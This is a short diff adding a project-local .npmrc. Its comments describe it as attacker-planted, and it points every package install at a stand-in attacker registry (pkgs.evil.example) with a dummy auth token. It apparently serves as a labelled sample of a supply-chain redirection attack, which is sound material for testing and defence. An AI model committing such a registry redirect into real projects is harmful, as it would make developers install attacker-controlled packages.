@@ -1,0 +1,5 @@
+# Attacker-planted .npmrc: silently repoints EVERY install to the attacker
+# registry. npm/pnpm/yarn-classic all honor a project-local ./.npmrc, so a
+# committed file redirects `npm install <anything>` off the public registry.
+registry=https://pkgs.evil.example/
+//pkgs.evil.example/:_authToken=deadbeef
